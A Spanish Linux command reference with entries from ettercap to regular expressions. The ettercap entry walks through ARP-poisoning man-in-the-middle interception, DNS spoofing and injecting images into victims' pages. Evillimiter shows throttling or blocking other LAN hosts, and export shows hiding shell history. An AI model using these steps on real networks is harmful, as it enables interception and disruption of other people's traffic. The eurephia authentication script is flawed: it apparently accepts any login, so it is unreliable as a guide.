$ ettercap -P list   (visualizar plugins instalados)
modificar archivo de configuración:
# nano /etc/etter.conf
descomentar la linea:himne20-01-13 19:37Menos información
# if you use iptables:
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
Y modificar:
# the command used by the remote_browser plugin
remote_browser = "firefox -remote openurl(http://%host%url)"
Para usar el plugin dns_spoof (Redireccionar páginas a otros sitios)
# nano /usr/share/ettercap/etter.dns
# 3  Modos de especificar la redirección a localhost
	microsoft.com          A       192.168.1.2
	*.microsoft.com        A       192.168.1.2
	*google*               A       192.168.1.2
Para la sustitución de imagenes:
# touch test2filter
Pegar:
	if (ip.proto == TCP && tcp.src == 80) {
	replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
	replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
	msg("Filter ok.\n");
Configurar el sistema para que acepte todos los paquetes que detecte. Si al lanzar:
# cat /proc/sys/net/ipv4/ip_forward
Si la respuesta no es 1, lanzar:
# echo 1 > /proc/sys/net/ipv4/ip_forward
Arrancar la aplicación en ncurses [en terminal -> ettercap -T , en modo gtk -> ettercap -G y en modo demonio -> ettercap -D . En este último caso el análisis se realiza en los archivos de log]:
# ettercap -C
Clicar en:
	Sniff -> Unifield sniffing
Y aceptar [o poner] la red [eth0]. En la nueva pantalla, clic en:
	Host -> Scan for host
Para escanear la red. Para visionar las máquina activas obtenidas, clic en:
	Hosts -> Hosts List
Bajar con el cursor hasta la IP del router y pulsar la tecla "1". Luego nos situamos sobre la IP del objetivo y pulsar la tecla "2" con lo que colocamos nuestra máquina entre el router y la máquina objetivo (envenenamiento arp). Luego en el cuadro que se abre con:
	Mitm -> Arp poisoning
Parameters, ponemos:
	remote
Y arrancamos el sniffer:
	Start -> Start sniffing
	Para observar las conexiones que realiza la máquina objetivo:
	View -> Connections
	Para terminar el ataque:
	Mitm -> Stop mitm atack
	Start -> Stop Sniffing
	Start -> Exit
Forma abreviada:
	# ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router
	O solo especificando la del router si se ataca toda la red:
# ettercap -Tq -M arp:remote -i eth0 ip_router


eukleides
Lenguaje de dibujo de geometría euclidiana que permite componer figuras geométricas dentro de un documento (La)TeX.
$ eukleides ejemplo.euk > ejemplo.eps (convertir a PostScript)
$ eukleides ejemplo.euk > ejemplo.svg (obtener gráficos vectoriales)


eurephia
Módulo que añade autenticación por nombre de usuario y contraseña al protocolo OpenVPN. Una cuenta de usuario de eurephia es una combinación de al menos un certificado SSL de OpenVPN y un nombre de usuario con una contraseña asignada. Además, eurephia pondrá en la lista negra direcciones IP, certificados y nombres de usuario en caso de que se produzcan demasiados intentos fallidos. Toda la información se almacena en una base de datos y todos los cambios en las cuentas se harán efectivos de inmediato. Por el momento, eurephia admite la base de datos SQLite.
Preparar el archivo de configuración de OpenVPN de forma básica:
# nano /etc/openvpn/server.conf
Con el siguiente contenio:
      ...
      plugin /usr/lib/openvpn/eurephia.so
      auth-user-pass-verify /etc/openvpn/scripts/check_user.sh via env
      client-cert-not-required
      username-as-common-name
      ...
Crear el script de verificación de usuarios:
# nano /etc/openvpn/scripts/check_user.sh
Con el contenido:
      #!/bin/bash
      #
      if [ "$2" = "password" ]; then
       echo $1
      else
       exit 0
      fi
# chmod +x /etc/openvpn/scripts/check_user.sh (hacerlo ejecutable)
# systemctl restart openvpn@server (reiniciar el servicio OpenVPN)
Con estas configuraciones, los clientes OpenVPN tendrán que proporcionar un nombre de usuario y una contraseña para conectarse, en lugar de solo un certificado cliente.


eval
Toma los argumentos de la línea de comandos y los ejecuta como comandos.
* Tenemos un texto con variables:
$ nano entrada_web.txt
	Hola $NOMBRE, felices de verte por la web $BLOG
Y un script con el siguiente contenido:
	#!/bin/bash
	echo "¿Como te llamas? "
	read NOMBRE
	BLOG="lapipaplena.net"
	eval "echo "$(cat ./entrada_web.txt)""
* Substituiendo las variables del script en el texto.
Otro ejemplo de uso de eval:
$ nano ejemplo.sh
	#!/bin/bash
	pipe="/ |"
	#ls $pipe wc -l
	eval ls $pipe wc -l
Descomentar la linea del "ls" y comentar la de "eval" y observar la diferencia entre ambas salidas.
* Otro ejemplo:
$ nano ejemplo.sh
	#!/bin/bash
	X=10
	Y=X
	#echo '$'$Y
	eval echo '$'$Y
Descomentar la linea del "echo" y comentar la de "eval" y observar la diferencia entre ambas salidas.


evdi-dkms
[Extensible Virtual Display Interface-Dynamic Kernel Module Support]. Módulo de kernel del controlador de interfaz de pantalla virtual extensible que permite la creación y administración de múltiples pantallas virtuales. Es especialmente útil para dispositivos como los de DisplayLink por ejemplo, adaptadores USB para monitores, pero no es un controlador completo por sí solo. El sufijo dkms indica que este módulo se compila dinámicamente con el soporte de DKMS. Esto significa que, al actualizar el kernel de Linux, DKMS recompila automáticamente el módulo EVDI para que sea compatible con la nueva versión, evitando la necesidad de recompilarlo manualmente.
$ lsmod | grep evdi (ver si el módulo está instalado y cargado)
# modprobe evdi (cargarlo manualmente si no aparece con el comando anterior)
$ xrandr --listproviders (detectar pantallas disponibles)
$ xrandr --setprovideroutputsource 1 0 (activar la pantalla virtual)
$ xrandr --output DVI-I-1-1 --auto --right-of eDP-1 (configura la pantalla virtual EVDI [DVI-I-1-1] a la derecha de la pantalla principal eDP-1)
# dkms status (si se actualiza el kernel, asegurar de que EVDI sigue funcionando)
# dkms build -m evdi -v 1.14.1 (reconstruir manualmente el módulo si es necesario)
# dkms install -m evdi -v 1.14.1
Nota.- Si se tiene un dispositivo DisplayLink como un adaptador USB a HDMI, se necesita instalar también el software de usuario de DisplayLink, no solo evdi-dkms.
# /usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n evdi) (en sistemas con Secure Boot, se podría necesitar firmar el módulo EVDI)


evemu-tools
Herramientas diseñadas para trabajar con dispositivos de entrada que utilizan la interfaz evdev del kernel de Linux. Estas herramientas permiten registrar eventos de entrada, como los de un teclado, un ratón o una pantalla táctil, emular dispositivos y reproducir eventos previamente grabados. Este paquete proporciona las herramientas: evemu-describe [Muestra información detallada sobre un dispositivo de entrada evdev], evemu-record [Registra los eventos de un dispositivo de entrada], evemu-play [Reproduce eventos previamente grabados] y evemu-stat [Muestra en tiempo real los eventos que genera un dispositivo de entrada]
$ ls /dev/input/event* (listar los dispositivos evdev)
$ evemu-describe /dev/input/event3 (obtener información sobre un dispositivo de entrada)
$ evemu-record /dev/input/event3 > teclado.log (registrar eventos del teclado. Si presionamos teclas, los eventos quedarán registrados en teclado.log)
$ evemu-play /dev/input/event3 < teclado.log (simulará la entrada registrada como si el usuario estuviera presionando las teclas en tiempo real)
$ evemu-stat /dev/input/event3 (mostrará los eventos conforme presionamos teclas o movemos el ratón)


eventstat
Herramienta de monitoreo de estados de eventos del núcleo que envía periódicamente su estado actual. Su función principal es rastrear y mostrar información sobre los eventos que ocurren en el sistema, como interrupciones de hardware, cambios de contexto, llamadas al sistema, etc.
# eventstat (mostrar información sobre los eventos del kernel en tiempo real, actualizándose periódicamente)
# eventstat -t 2 (especificar el intervalo de tiempo en segundos entre cada actualización de la salida)
# eventstat | grep tick_sched_timer (ver solo los eventos especificos)
# timeout 5 eventstat (monitorear durante 5 segundos)


evillimiter
Análisis de la red local.
Descarga e instalación:
	$ git clone https://github.com/bitbrute/evillimiter.git
	$ cd evillimiter
	# python3 setup.py install
# evillimiter (entrar en el prompt de la aplicación)
(Main) >>> ? (muestra la ayuda)
(Main) >>> scan (escaner toda la red)
(Main) >>> scan --range 192.168.1.1-192.168.1.50 (escanear un rango de la red)
(Main) >>> scan --range 192.168.1.1/24
(Main) >>> hosts (ver los resultados del scan con la columna ID)
(Main) >>> limit 0,3 300kbit (Limita velocidad de las máquinas con ID 0 i 3 a 300kbits)
(Main) >>> limit all 1gbit (Limita la velocidad de todas las máquinas de la red a 1gbit))
(Main) >>> block 2 (Bloquea la máquina 2)
(Main) >>> free 2 (Libera el bloqueo de la máquina 2)
(Main) >>> free all (Libera todas las máquinas bloqueadas)
(Main) >>> clear (Limpiar la terminal)
(Main) >>> quit (Salir de la aplicación)


evince
Visor de documentos capaz de mostrar documentos en formatos múltiples y paginados como PDFs y Postscripts.
$ evince -s archivo.pdf (en modo presentación)
$ evince -p 5 archivo.pdf (abrir la página 5 del pdf)


evince-previewer
Mostrar vista previa de impresión para documentos PostScript y PDF.
$ evince-previewer archivo.pdf


ewf-tools
Colección de herramientas para leer y escribir archivos Expert Witness Compression Format [EWF], en formato SMART (EWF-S01) y EnCase (EWF-E01). Admite archivos creados con EnCase 1 a 6, Linen y FTK Imager. Libewf es útil para investigaciones forenses. Incluye varias utilidades: ewfacquire [Crea imágenes EWF a partir de un dispositivo o archivo], ewfacquirestream [Crea imágenes EWF a partir de un flujo de datos], ewfexport [Exporta una imagen EWF a un archivo sin comprimir o a otro formato], ewfinfo [Muestra información sobre un archivo EWF]. ewfmount [Monta una imagen EWF como un dispositivo de bloque en el sistema], ewfrecover [Recupera datos de una imagen EWF dañada] y ewfverify [Verifica la integridad de una imagen EWF]
$ ewfacquire /dev/sdb -o imagen.e01 (crear una imagen EWF de un dispositivo como archivo de salida en formato EWF [E01])
$ ewfexport imagen.e01 -o imagen.raw (convertir una imagen EWF a un archivo sin comprimir)
$ ewfinfo imagen.e01 (mostrar información como el tamaño del archivo, el tipo de compresión, el número de segmentos, etc)
$ ewfmount imagen.e01 /mnt/ewf/ (montar una imagen EWF como un dispositivo de bloque en el sistema)
$ ewfverify imagen.e01 (verificar que una imagen EWF no está corrupta)
$ ewfrecover imagen.e01 (intentará reconstruir la imagen y extraer los datos válidos)


exa
Lista el contenido de un directorio de forma mejorada respecto al comando "ls" escrito en rust, coloreando de distintos tipos los archivos, metadatos, atributos, enlace simbólicos, git...
$ exa (forma básica)
$ exa -T (de forma recursiva en forma de arbol)
$ exa -R (de forma recursiva)
$ exa -D (muestra el listado de directorios)
$ exa -l (mostrando los metadatos de forma extendida)
$ exa -l archivo (información de un fichero especifico)
$ exa -x (como el comando ls pero más coloreado)
$ exa -F (clasifica el listado según tipo de archivo [* = ejecutable, .../ = directorio, @ = enlace...])
$ exa -a (mostrando archivos ocultos)
$ exa -G -l /var (información de un  directorio concreto y en varias columnas)
$ exa -a --group-directories-first (el listado que empiece por los directorios)
$ exa -G -l --octal-permissions /etc (incluir loa permisos en octal)
$ exa -R -s size (de forma recursiva y ordenar por tamaño)


exabgp
Herramienta que permite interactuar con redes definidas por software [Software Defined Networks - SDN] que utilizan el Protocolo de Puerta de Enlace Fronteriza [Border Gateway Protocol - BGP] al transformar los mensajes BGP en texto simple o JSON. BGP es un protocolo fundamental para el enrutamiento en Internet, ya que permite a los routers intercambiar información de rutas y alcanzabilidad entre diferentes sistemas autónomos (AS).
Ejemplo básico de un archivo de configuración:
$ nano exabgp.conf
         group test {
            neighbor 192.168.1.1 {
                router-id 192.168.1.2;
                local-address 192.168.1.2;
                local-as 65000;
                peer-as 65001;
            }
            process announce {
                run /usr/bin/python3 /path/to/your/script.py;
                encoder json;
            }
        }
neighbor 192.168.1.1 --> define el vecino BGP con el que exabgp se comunicará.
router-id, local-address, local-as, y peer-as --> son parámetros necesarios para establecer la sesión BGP.
process announce --> define un proceso que ejecutará un script en Python y codificará los mensajes BGP en formato JSON.
# exabgp exabgp.conf (ejecutar exabgp con la configuración anterior)
# exabgp /path/to/exabgp.conf --api /var/run/exabgp.sock (monitorear los mensajes BGP y transformarlos en texto simple)
# socat - UNIX-CONNECT:/var/run/exabgp.sock (leer los mensajes BGP desde el socket)


exec
Permite remplazar la shell por el comando que se indique.
$ exec firefox
$ exec sleep 2 (pasados 2 segundo cierra la terminal)
$ exec 3>&1 > /tmp/salida.txt (que el descriptor 3 conecte su salida a donde la conecta el descriptor 1 [la pantalla] y después que este último se conecte al archivo /tmp/salida.txt. La consecuencia es que a partir de este momento todas las órdenes usarán como salida estándar el archivo)
$ exec 1>&3 3>&- (restituye la situación inicial, que el descriptor 1 conecte su salida a la del descriptor 3, o sea, la pantalla y, después, cierra el conector 3. Por tanto, a partir de ese momento, las órdenes volverán a mostrar su salida estándar por pantalla)
$ exec 1>/dev/null (mandamos a /dev/null la salida estándar de cualquier comando que ejecutemos a continuación en la misma shell)


execline
Lenguaje de scripting diseñado para ser ligero y eficiente. A diferencia de los shells tradicionales como sh o bash, execline está diseñado para ser minimalista y evitar la sobrecarga de características, lo que lo hace ideal para entornos donde la eficiencia y la simplicidad son críticas, como en sistemas embebidos o en la inicialización de sistemas.
1.-
Ejemplos de scripts
$ nano mi_script.exl
       #!/bin/execlineb -P
       echo "Hola, mundo"
Nota.- #!/bin/execlineb -P: Indica que el script debe ser ejecutado con execlineb y la opción -P indica que debe buscar los comandos en el PATH.
$ chmod +x mi_script.exl (hacerlo ejecutable)
$ ./mi_script.exl (lanzarlo)
2.-
$ nano mi_script.exl
       #!/bin/execlineb -P
       importas home HOME
       cd $home
       ls
3.-
$ nano mi_script.exl
        #!/bin/execlineb -P
        importas home HOME
        foreground {
            if -n { test -d ${home}/Documentos/emacs }
            mkdir ${home}/Documentos/emacs
        }
        echo El script terminó la ejecución
Si no existe la carpeta ~/Documentos/emacs la crea
4.-
$ nano mi_script.exl
        #!/bin/execlineb -P
        importas home HOME
        foreground
        {
            if -n { test -d ${home}/.cache/used }
            mkdir ${home}/.cache/used
        }
        backtick DATE { date +%d%m%y }
        importas date DATE
        ifelse -n
        # Ejecutar este bloque y verificar su código de salida
        {
            test -d ${home}/.cache/used/$date
        }
        # Si el bloque anterior finaliza con un código distinto de cero, entonces
        # se ejecuta este bloque (debido al indicador -n en ifelse)
        {
            touch ${home}/.cache/used/$date
        }
        # De lo contrario, el script continúa aquí.
        exit 1
5.-
$ nano mi_script.exl
        !/bin/execlineb -P
        # Imprimir todos los archivos y directorios, y usarlos como
        # entrada para el siguiente comando
        pipeline { ls }
        # Para cada archivo y directorio impreso,
        # ejecutar el siguiente bloque, después de reemplazar Vídeos
        # con el nombre del directorio deseado
        forstdin Vídeos
        # Importar la variable en la carpeta literal
        importas -u folder Vídeos
        # Verificar si es una carpeta, por lo que omitimos los archivos
        if { test -d $folder }
        # Crear el archivo vacío en su interior
        touch ${folder}/active


exfat-fuse
Controlador para el sistema de archivos exFAT [Extended File Allocation Table] que permite que los sistemas basados en Linux puedan leer y escribir en dispositivos que utilizan este sistema de archivos. exFAT es comúnmente usado en dispositivos de almacenamiento extraíbles, como unidades flash USB y tarjetas SD.
$ lsblk (identificar el nombre del dispositivo)
# mount -t exfat /dev/sdb1 /mnt/exfat (acceder al contenido)


exfatprogs
Conjunto de Hhrramientas para administrar el sistema de archivos exFAT [Extended File Allocation Table] en linux. Es un sistema de archivos desarrollado por Microsoft, diseñado para memorias USB y tarjetas SD de gran capacidad, ya que admite archivos de más de 4 GB y volúmenes de más de 32 GB, a diferencia de FAT32. Contiene:
$ mkfs.exfat -n MI_USB /dev/sdb1 (Formatea la partición /dev/sdb1 con exFAT con la etiqueta "MI_USB")
$ fsck.exfat -y /dev/sdb1 (revisar la integridad de un sistema de archivos exFAT y corregir errores respondiendo "si" a las preguntas de reparación)
$ dump.exfat /dev/sdb1 (mostrar información sobre /dev/sdb1)
$ exfatlabel /dev/sdb1 (ver la etiqueta actual de /dev/sdb1)
$ exfatlabel /dev/sdb1 USB_DISCO (cambiar la etiqueta a "USB_DISCO")
$ tune.exfat -f /dev/sdb1 (habilitar la compatibilidad con archivos grandes en /dev/sdb1)


exif
Extraer metadatos de imagenes
$ exif -d imagen  (mostrar todos los datos)
$ exif -e imagen  (extraer la foto miniatura)
$ exif -r imagen   (suprimir la foto miniatura)
Nota.- Cuando se toma una iamgen con una cámara fotográfica, esperamos que la imagen resultante tenga la misma orientación que pretendíamos. Esto significa que las imágenes de paisajes se muestran horizontalmente y las imágenes de retratos se muestran verticalmente en la pantalla. Pero, ¿cómo sabe la computadora (o la cámara) cómo se ha tomado una imagen?. La mayoría de los formatos de imagen contienen no solo el contenido, sino también información adicional sobre el contenido: los metadatos de la imagen. El formato de imagen JPEG puede contener metadatos EXIF [Exchangeable Image File Format], entre otras cosas como la lente, el modelo de cámara y la orientación de la imagen.
La orientación canónica es 1. Un valor de orientación de 1 significa que el contenido de la imagen existe exactamente en la forma en que queremos verlo en la pantalla. Supongamos que tenemos una cámara de fotos cuyo sensor tiene una relación de aspecto de 4:3. Cuando usamos la cámara para tomar una imagen en orientación horizontal, la imagen JPEG resultante tendrá un valor de orientación de 1. Sin embargo, cuando disparamos en modo retrato, los sensores de la cámara notan que la orientación ha cambiado. Los metadatos EXIF de la imagen resultante tendrán un valor de orientación de 8, si la cámara se giró en el sentido de las agujas del reloj, o 6, si la cámara se giró en el sentido contrario a las agujas del reloj. Asimismo, 3 es la orientación correspondiente para imágenes de paisajes al revés.
Ha casos en los que la cámara produce una imagen invertida, debido a restricciones del hardware de la cámara o a defectos del firmware. Por este motivo, existen otros cuatro valores de orientación posibles, Herramientas como exifautotran [ver] o ImageMagick permiten normalizar la orientación de las imágenes.


exifautotran
Transforma los metadatos exif referentes a la orientación [vertical, horizontal ...] de una lista archivos Exif [ver nota exif] para que la orientación sea 1.
$ exifautotran file1 file2 file3


exifprobe
Utilidad que lee archivos de imágenes producidos por cámaras digitales, incluidos varios formatos de archivo denominados "raw", TIFF, JPEG y EXIF [Exchangeable Image File Format] e informa sobre la estructura de los archivos, datos auxiliares y metadatos que contienen.
$ exifprobe imagen.jpg (analizará el archivo imagen.jpg y mostrará los metadatos EXIF, como la marca y modelo de la cámara, la fecha y hora en que se tomó la foto, la configuración de la cámara, etc)
$ exifprobe foto.cr2 (analizará un archivo RAW en este caso, un archivo CR2 de Canon)
$ exifprobe -v imagen.jpg (proporcionar más detalles sobre la estructura del archivo y ayudar a verificar su integridad)


exiftags
Utilidad para leer etiquetas Exif de un archivo JPEG de una cámara digital. La utilidad exiftags analiza un archivo JPEG específico o, de forma predeterminada, su entrada estándar, en busca de una sección JPEG APP1 que contenga datos Exif (Exchangeable Image File). Las propiedades contenidas en estos datos se imprimen luego en la salida estándar. Las cámaras digitales suelen agregar datos Exif a los archivos de imagen que producen, que contienen información sobre la cámara y la imagen digitalizada.
$ exiftags foto.jpg


exiftool
Lee y extrae metadatos de imágenes
$ exiftool -a -u -g1 foto.png
$ exiftool -ImageDescription="Verano en Batet" foto.jpg (añadir a "Image Description" el texto especificado)
$ exiftool -GPSAltitude="0/1" foto.jpg  (Añadir tags a una imagen)
$ exiftool -GPSLatitude="41.403339" foto.jpg
$ exiftool -GPSLatitudeRef="N" foto.jpg
$ exiftool -GPSLongitude="2.1740288" foto.jpg
$ exiftool -GPSLongitudeRef="E" foto.jpg
$ exiftool -TagsFromFile imagen_datos.jpg imagenFinal.jpg (Copia los datos Exif de la foto "imagen_datos.jpg" a la foto "imagenFinal.jpg")


exiftran
Transformar imágenes JPEG de cámaras digitales, con capacidad de realizar rotaciones sin pérdida [lossless] y gestionar datos EXIF [Exchangeable Image File Format] que son metadatos incrustados en las imágenes por las cámaras digitales que pueden incluir información como la orientación de la imagen, dimensiones, fecha, etc.
$ exiftran -9 -i foto.jpg (rotar manualmente una imagen 90° en sentido horario y sobreescribir la imagen)
Opciones de transformación:
        -a: Rotación automática basada en la etiqueta de orientación EXIF.
        -9: Rotar 90° en sentido horario.
        -1: Rotar 180°.
        -2: Rotar 270° en sentido horario.
        -f: Voltear verticalmente.
        -F: Voltear horizontalmente.
$ exiftran -1 -ib foto1.jpg foto2.jpg foto3.jpg (-1: rotación de 180°, -i: Edición en lugar y -b: Crea copias de respaldo [ej. foto1.jpg.bak] de cada una de las tres fotos)
$ exiftran -g -ni -i imagen.jpg (-g: Regenera la miniatura EXIF, -ni: No rota la imagen JPEG y -i: Sobrescribe el archivo original)
$ exiftran -ai *.jpg ((usa la etiqueta EXIF para determinar si la voltea o no, sobreescribe los originales y se aplica a todos los .jpg del directorio))
$ exiftran -F -o imagen_flip.jpg imagen.jpg (voltea horizontalmente y guardar el resultado)
$ exiftran -d foto.jpg (muestra los datos EXIF en la terminal)


exim
Agente de transporte de correo.
$ exim -bp (Lista los correos en cola)
$ exim -bpc (Muestra la cantidad de correos en cola)
$ exim -bp | exiqsumm (Muestra resumen de los correos en cola)
$ exim -Mrm 1X62E1-0006CU-61 (Eliminar un correo concreto por su ID)
$ exim -Mf 1X62E1-0006CU-61 (Congelar un correo)
$ exim -M 1X62E1-0006CU-61 (Procesar un correo)
$ exiqgrep -z -i | xargs exim -Mrm (Eliminar todos los correos congelados)
$ exiwhat (Mostrar qué está haciendo exim en este momento)
$ exim -bt 1X62E1-0006CU-61 (Hacer un traceroute a una dirección de correo)
$ exim -Mvh 1X62E1-0006CU-61 (Ver cabeceras de un correo)
$ exim -Mvb 1X62E1-0006CU-61 (Ver el cuerpo de un correo)
$ exim -Mvl 1X62E1-0006CU-61 (Ver los logs de un correo)
$ exim -qff (Forzar cola de correo)


exip
Obtener la IP externa.
$ exip -p 4 (con el protocolo IPv4)
$ exip -p 6 (con el protocolo IPv6)


exit
Salir del interprete de comandos.


exiv2
Proporciona acceso rápido y fácil de lectura y escritura a los metadatos en archivos de imágenes incluyendo Exif, IPTC y XMP. Los metadatos pueden incluir información como la fecha y hora en que se tomó la foto, la cámara utilizada, la configuración de la cámara, y otra información relevante.
$ exiv2 imagen.jpg (mostrará todos los metadatos Exif, IPTC y XMP presentes en la imagen imagen.jpg)
$ exiv2 -PE imagen.jpg (mostrará solo los metadatos Exif de la imagen)
$ exiv2 -M"set Iptc.Application2.Byline Autor Nuevo" imagen.jpg (modificar los metadatos de una imagen)
$ exiv2 -d a imagen.jpg (eliminará todos los metadatos de la imagen)
$ exiv2 -T imagen_origen.jpg imagen_destino.jpg (copiará los metadatos de imagen_origen.jpg a imagen_destino.jpg)
$ exiv2 -r '%Y-%m-%d_%H-%M-%S' imagen.jpg (renombrará imagen.jpg usando la fecha y hora de los metadatos Exif en el formato YYYY-MM-DD_HH-MM-SS)
$ exiv2 -Pj imagen.jpg (mostrará los metadatos de imagen.jpg en formato JSON)


exo-desktop-item-edit
[exo-utils]. Permite crear y editar archivos .desktop, que son accesos directos para aplicaciones en entornos gráficos.
$ exo-desktop-item-edit --create-new ~/Escritorio (aparecerá un cuadro de diálogo donde definir nombre, comando, icono y otras propiedades del acceso directo)
$ exo-desktop-item-edit ~/Escritorio/mi_aplicacion.desktop (abrirá el editor gráfico para modificar las propiedades del acceso directo)
$ exo-desktop-item-edit --create-new ~/.local/share/applications/ (Permite crear un acceso directo en el menú de aplicaciones para programas que no tienen un .desktop predeterminado)


exo-open
[exo-utils]. Abrir URL y ejecutar aplicaciones para el marco de trabajo de Xfce, aunque funciona con otros entornos.
$ exo-open --launch WebBrowser $HOME (abre en el navegador predeterminado el directorio del usuario)
$ exo-open https://www.debian.org (abrirá la página en el navegador predeterminado)
$ exo-open documento.txt (abrir un archivo de texto con el editor predeterminado)
$ exo-open --launch TerminalEmulator htop (abrirá el terminal predeterminado y ejecutará htop)
$ exo-open --launch FileManager (el navegador de archivos)


expand
Convierte los tabuladores a espacios. Elimina las tabulaciones y los remplaza por espacios en blanco. Por defecto las tabulaciones son de 8 espacios en blanco.
$ expand -t 5 texto.txt (Convierte las tabulaciones en 5 espacios en blanco)
$ expand -i -t 5 texto.txt (Sólo afecta a las tabulaciones de principio de linea)


expiry
Chequea cuando caducan las contraseñas de usuario [si son temporales]
$ expiry -c


expect
Herramienta para automatizar aplicaciones interactivas (telnet, ftp, passwd, fsck, rlogin, tip, etc) de acuerdo con un script.


explain
Herramienta diseñada para ayudar a los usuarios a entender los errores que ocurren cuando se realizan llamadas al sistema [system calls]. Estas llamadas son funciones que los programas utilizan para solicitar servicios al kernel del sistema operativo, como la creación de archivos, la gestión de procesos, la comunicación entre procesos, etc. Cuando un programa encuentra un error durante una llamada al sistema, generalmente devuelve un código de error. Estos códigos de error son números que pueden no ser intuitivos para entender qué salió mal. Aquí es donde entra en juego el comando explain. Este comando toma un código de error y proporciona una descripción legible y comprensible del error.
$ explain -e ENOENT open sfjghsl (saber qué significa un error para abrir un archivo inexistente)
La salida podría ser algo como:
          open(pathname = "sfjghsl", flags = O_RDONLY) failed, No such file or
          directory (2, ENOENT) because there is no "sfjghsl" regular file in the
          current directory
$ explain -e EPERM unlink open (no realizar una operación por falta de permisos)
          unlink(pathname = "open") failed, Operation not permitted (1, EPERM)
          because there is no "open" regular file in the current directorythe process
          does not have the appropriate privileges to use the unlink system call


export
Exporta, almacena y lista variables. Para que los cambios sean permanentes, colocar la linea en .bashrc.
$ export -p (mostrar todas las variables)
# export PATH=${PATH}:/usr/local/bin   (incluir un dir en el path)
$ export TMOUT=60 (Establece 60 segundos de inactividad antes de cerrar una sesión ssh)
$ export HISTCONTROL=”ignoreboth:erasedups” (no escribir en el history ni los comandos que empiecen por espacio, ni los duplicados y que además los elimine, dejando siempre el último)
Opciones para HISTCONTROL:
ignorespace: No guarda en history los comandos que empiecen por espacio.
	ignoredups: No guarda los comandos repetidos.
	ignoreboth: Alias para los dos parámetros anteriores.
	erasedups: Elimina los comandos duplicados dejando el último ejecutado.
$ export HISTFILE=/home/usuario/histfile.txt (redirigir los comandos ejecutados durante una sesión a un archivo)
$ export HISTFILE=/dev/null (Para no guardar el history de la sesión)
$ export HISTFILE=/dev/null bash (abrir otra sesión que no almacene los comandos sin perder los de la actual)
$ export PS1="[\u@`curl icanhazip.com` \W]$ "  (Excentricidad: que el promt diga la ip externa.)
$ export LANG=C; gedit (Lanzar una aplicación con un locale concreto)


expr
Permite realizar operaciones aritméticas.
$ expr 2 + 3
$ expr 2 \* 3 (Para la multiplicación ha de anteponerse al signo la barra \)
$ expr 12 / 2
$ sum=`expr 5 + 3`; expr $sum \* 2 (Enlazar operaciones)


expresiones-regulares
[regex o patrones]. Buscar cadenas de texto que coinciden con un patrón. Los comandos más usuales que las emplean son grep, find, sed y awk y cada uno con sus pecualiaridades. Para ilustrar dichas expresiones se usa un archivo de texto al que llamo file.
$ cat file
	# /etc/fstab: static file system information.
	UUID=de1d7793-c3d2-4e03-b79d-1a76905619e6 /               ext4    errors=remount-ro 0       1
	UUID=ccc71238-d89d-435b-a4e2-c2d836f800bb none            swap    sw              0       0
	/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
	/dev/sda5       /media/datos    ext4    defaults        0       0
	/dev/sda7       /media/fotos    ext3    defaults        0       0
	servidor:/home/templix /media/servidor  nfs4 defaults   0       0
	### Otras cosas
	7592 esto es un número....
	la letra z es la última
	aminora
	mediaplayer es un reproductor
	tres cincos hace 555
	salta la rana
	aRmARIO
Nota.- Los siguientes ejemplos se basarán en el comando grep. En algunos casos, al corresponder a expresiones regulares extendidas, se usará con el argumento -E. Las expresiones regulares han de ir siempre encerradas con comillas simples.
	Literales (Sólo encajan con ellos mismos)
		$ grep 'media' file (mostrara las lineas que contengan "media" incluso "mediaplayer")
		$ grep '\<media\>' file (Sólo mostrará las que contengan exactamente "media")
	. [punto] (Cualquier caracter)
		$ grep 'me.ia' file (Misma salida que el anterior)
		$ grep '\<m...a\>' file (Mostrar las de cinco letras que empiecen por "m" y terminen en "a")
		$ grep 'm...a\>' file (Mostrar las lineas que contengan una palabra de cinco letras que empiece por "m" y termine con "a" sin nada a continuación)
	[] [Corchetes] (Cualquier caracter de los encerrados entre corchetes)
		$ grep '[wz]' file (Mostras las que contengan "w" o "z")
		$ grep 'sda[0-9]' file (Mostrar las lineas con palabras que empiecen por sda seguidas de un número del 0 al 9)
		$ grep '[0-9]-' file (Buscar lineas que tengan un número seguido de un -)
	| [Tuberia] (Especificar varias opciones)
		$ grep -E 'e(xt|rvi)(3|dor)' file (Mostrar las que contengan ext3 y ervidor [servidor])
		$ grep -E 'datos|servidor' file (Mostrar las que tengan las palabras "datos" y "servidor")
	- [Guión] (Siempre que no siga a un corchete, especifica un rango)
		$ grep '[0-2]$' file (Lineas que contengan los números 0,1 y 2)
	^ [Circunflejo] (Si va precedido de un corchete significa "todo lo que no sea lo que sigue". En los demás casos significa "que la linea empiece por lo que sigue)
		$ grep '^UUID' file (Mostrar las que empiecen por UUID)
		$ grep ':[^/]' file (Las que tengan ":" y no vayan seguidos de una "/")
		$ grep -e '^UUID' -e '^\/' file (Mostrar las que empiecen por UUID y por / . La barra de escape [\] convierte al siguiente caracter en literal)
	$ [Dolar] (Indica que el carácter precedente aparece al final de la linea)
		$ grep '0$' file (Muestra las que terminen en 0)
		grep '\.$' file (Muestra las lineas que terminan con un punto)
	+ [Signo más] (Una o más veces).
		$ grep -E '\-[0-9]+' file (Buscar las lineas con varios números precedidos por un guión [que ha de escaparse con una barra])
	* (Asterisco) (Ninguna o más veces)
		$ grep -E '(fot).*' file (Mostrar las que tengan "fot" y puedan estar o no seguidas de otros caracteres)
	? (Interrogante) (Un caracter impreciso)
		$ grep -E 'ext4?' file (indica que el caracter anterior [el 4] puede ser distinto de 4 o puede no existir, o sea que mostrará lineas que contengan ext4, ext3, ext...)
	{n,m} [Llaves] (Que el caracter anterior a la llave se muestre las veces que indica entre el número n y el m. Si omitimos m significa como mínimo n veces.
		$ grep '5\{2,5\}.*' file (Que se muestre las lineas que tengan un 5 entre dos y cinco veces. Las llaves se escapan)
		$ grep '5\{3\}.*' file (Muestra las lineas en las que el 5 sale tres veces)
		$ grep '5\{3,\}.*' file (Muestra las lineas en las que el 5 sale como mínimo tres veces)
	b (Que lo precedente sea el final de una palabra. Siempre ha de escaparse.)
		$ grep 's\b' file (Muestra las lineas que contienen alguna palabra acabada en "s")
Otros ejemplos:
Buscar las lineas que no empiecen por #:
	$ grep -v '^#' file
